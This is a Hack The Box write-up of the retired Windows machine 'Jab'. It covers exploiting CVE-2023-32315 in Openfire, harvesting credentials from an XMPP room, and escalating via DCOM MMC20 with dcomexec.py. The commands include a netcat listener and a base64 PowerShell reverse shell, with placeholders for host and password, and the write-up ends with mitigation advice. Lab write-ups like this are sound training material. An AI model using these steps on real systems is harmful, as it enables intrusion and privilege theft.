---
machine: Jab
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, ad, openfire, xmpp, dcom, bloodhound]
---

# Jab — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Openfire 4.7.5 is vulnerable to CVE-2023-32315: create an administrator and upload a plugin that runs code as `svc_openfire`. The XMPP server reveals a room with credentials and a Kerberoastable account. BloodHound shows first-degree DCOM privileges for `svc_openfire`, and `dcomexec.py` with the MMC20 object executes as administrator.

## Recon

```bash
nmap -Pn -sCV -p53,88,389,445,5222,5269,7070,7443,5985 <IP>
```

- `53/88/389/445` confirm a `jab.htb` DC.
- `5222/5269` are XMPP and `7070/7443` the Openfire HTTP console.
- Openfire is 4.7.5, before the CVE-2023-32315 fix.

## Enumeration

- CVE-2023-32315 allows creating an administrator through an authentication bypass.
- The panel uploads plugins; a malicious plugin runs commands as `svc_openfire`.
- The XMPP server has a room with pentest chatter and `jmontgomery` credentials.

## Foothold

Exploit CVE-2023-32315 to create the admin user, upload an Openfire plugin with a reverse shell and obtain a shell as `svc_openfire`.

```bash
python3 CVE-2023-32315.py -t http://<IP>:9090
# log in with the created user and upload the plugin
nc -lnvp 443
```

## Lateral movement

`svc_openfire` credentials validate over SMB. BloodHound shows the account has first-degree DCOM privileges, allowing remote command execution without local admin.

## Privilege escalation

Use `dcomexec.py` with the `MMC20` object and `-silentcommand` to launch a reverse shell. The process runs as administrator.

```bash
dcomexec.py jab.htb/svc_openfire:'<PASSWORD>'@<IP>   'powershell -e <BASE64_REVSHELL>' -silentcommand -object MMC20
```

## Evidence

- Openfire 4.7.5 and admin user created with CVE-2023-32315.
- Shell as `svc_openfire` and XMPP credentials.
- DCOM with MMC20 and administrator shell.

## Lessons learned

- A messaging server is a source of credentials and context.
- DCOM privileges can mean remote execution without local admin.
- A malicious admin plugin is a direct path to RCE.

## Mitigation and detection

- Update Openfire and restrict its console.
- Review DCOM ACLs and service account privileges.
- Audit user creation and plugin uploads.

## References

- [0xdf — Jab](https://0xdf.gitlab.io/2024/06/29/htb-jab.html)
- [IppSec — Jab](https://www.youtube.com/watch?v=tprP-GDW_6c)
- [Hack The Box — Jab](https://app.hackthebox.com/machines/jab)
